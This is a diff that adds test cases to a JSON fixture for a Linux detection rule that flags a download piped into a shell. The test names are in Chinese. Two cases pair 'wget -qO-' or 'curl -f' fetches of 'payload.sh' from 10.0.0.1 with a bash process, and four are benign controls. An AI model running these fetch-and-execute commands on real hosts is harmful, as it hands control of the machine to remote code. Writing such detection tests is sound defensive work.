@@ -6068,5 +6068,323 @@
         ]
       }
     ]
+  },
+  {
+    "name": "wget -qO- | sh：输出到 stdout 照算",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "wget",
+            "file": {
+              "path": "/usr/bin/wget"
+            },
+            "cmd_line": "wget -qO- http://10.0.0.1/payload.sh",
+            "parent_process": {
+              "cmd_line": "bash /tmp/linux.sh"
+            }
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "bash",
+            "file": {
+              "path": "/usr/bin/bash"
+            },
+            "cmd_line": "bash",
+            "parent_process": {
+              "cmd_line": "bash /tmp/linux.sh"
+            }
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:linux-download-pipe-shell",
+        "anchor": "1",
+        "evidence": [
+          "2",
+          "1"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "curl -f url | bash：-f 不是表单上传",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "curl",
+            "file": {
+              "path": "/usr/bin/curl"
+            },
+            "cmd_line": "curl -f http://10.0.0.1/payload.sh",
+            "parent_process": {
+              "cmd_line": "bash /tmp/linux.sh"
+            }
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "bash",
+            "file": {
+              "path": "/usr/bin/bash"
+            },
+            "cmd_line": "bash",
+            "parent_process": {
+              "cmd_line": "bash /tmp/linux.sh"
+            }
+          }
+        }
+      }
+    ],
+    "matches": [
+      {
+        "rule": "temporal:linux-download-pipe-shell",
+        "anchor": "1",
+        "evidence": [
+          "2",
+          "1"
+        ]
+      }
+    ]
+  },
+  {
+    "name": "curl 输出到 /dev/null 与 bash -s 同时出现：不算管道下载（良性对照）",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "curl",
+            "file": {
+              "path": "/usr/bin/curl"
+            },
+            "cmd_line": "curl --silent --show-error --output /dev/null --connect-timeout 5 http://10.0.0.1:12345",
+            "parent_process": {
+              "cmd_line": "bash /tmp/linux.sh"
+            }
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "bash",
+            "file": {
+              "path": "/usr/bin/bash"
+            },
+            "cmd_line": "bash",
+            "parent_process": {
+              "cmd_line": "bash /tmp/linux.sh"
+            }
+          }
+        }
+      }
+    ],
+    "matches": []
+  },
+  {
+    "name": "curl POST 上传数据与 bash -s 同时出现：不算管道下载（良性对照）",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "curl",
+            "file": {
+              "path": "/usr/bin/curl"
+            },
+            "cmd_line": "curl -s -X POST -H Accept:application/json https://api.example.com/repos/x/pulls -d @/tmp/pr_body.json",
+            "parent_process": {
+              "cmd_line": "bash /tmp/linux.sh"
+            }
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "bash",
+            "file": {
+              "path": "/usr/bin/bash"
+            },
+            "cmd_line": "bash",
+            "parent_process": {
+              "cmd_line": "bash /tmp/linux.sh"
+            }
+          }
+        }
+      }
+    ],
+    "matches": []
+  },
+  {
+    "name": "curl 访问本机回环与 bash -s 同时出现：不算管道下载（良性对照）",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "curl",
+            "file": {
+              "path": "/usr/bin/curl"
+            },
+            "cmd_line": "curl -s -k localhost:9200/http_log-*/_search?size=0",
+            "parent_process": {
+              "cmd_line": "bash /tmp/linux.sh"
+            }
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "bash",
+            "file": {
+              "path": "/usr/bin/bash"
+            },
+            "cmd_line": "bash",
+            "parent_process": {
+              "cmd_line": "bash /tmp/linux.sh"
+            }
+          }
+        }
+      }
+    ],
+    "matches": []
+  },
+  {
+    "name": "wget 默认写文件与 bash -s 同时出现：不算管道下载（良性对照）",
+    "events": [
+      {
+        "id": "1",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "wget",
+            "file": {
+              "path": "/usr/bin/wget"
+            },
+            "cmd_line": "wget http://10.0.0.1/payload.sh",
+            "parent_process": {
+              "cmd_line": "bash /tmp/linux.sh"
+            }
+          }
+        }
+      },
+      {
+        "id": "2",
+        "seconds": 10,
+        "group": "A",
+        "asset": "host-1",
+        "username": "root",
+        "os": "linux",
+        "classUid": 1007,
+        "raw": {
+          "activity_id": 1,
+          "process": {
+            "name": "bash",
+            "file": {
+              "path": "/usr/bin/bash"
+            },
+            "cmd_line": "bash",
+            "parent_process": {
+              "cmd_line": "bash /tmp/linux.sh"
+            }
+          }
+        }
+      }
+    ],
+    "matches": []
   }
 ]
